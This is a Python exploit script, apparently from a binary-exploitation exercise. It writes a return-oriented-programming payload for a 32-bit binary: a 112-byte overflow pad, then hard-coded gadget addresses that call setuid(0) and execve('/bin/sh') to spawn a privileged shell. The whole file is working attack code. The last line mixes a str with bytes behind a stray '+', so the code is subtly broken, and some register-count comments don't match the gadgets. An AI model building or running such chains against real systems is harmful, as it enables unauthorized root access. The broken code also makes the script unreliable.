from shellcode import shellcode
import sys


# 0x080540e3 : mov ebx, 0xffffffff ; jmp 0x8054030  ----> maybe


sys.stdout.buffer.write(b'A'*(112) + # b'/bin/sh' + # b'//sh' +
                        # setuid section
                        0x0806ea89.to_bytes(4, 'little') + # set eax to 0
                        b'A' * 4 +
                        0x080c89ec.to_bytes(4, 'little') + # set ebx to eax (0)

                        0x08095956.to_bytes(4, 'little') + # set eax to 8
                        b'A' * 4 +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 14
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 20
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +
                        0x0807fe39.to_bytes(4, 'little') +

                        0x080732cf.to_bytes(4, 'little') + # call int 0x80

                        # execve section - works
                        0x08096740.to_bytes(4, 'little') +  # set eax to 7
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 8
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 9
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 10
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 11

                        0x080481d1.to_bytes(4, 'little') + # set ebx to address of /bin/sh
  
                        0x08056485.to_bytes(4, 'little') + # set edx to 0xffffffff
                        0x0805e085.to_bytes(4, 'little') + # inc edx to 0
                        0x0806f13c.to_bytes(4, 'little') + # set ecx to 0xffffffff
                        0x08094141.to_bytes(4, 'little') + # inc ecx to 0

                        0x080732d0.to_bytes(4, 'little') + # call int 0x80
                        + '/bin/sh'
                        )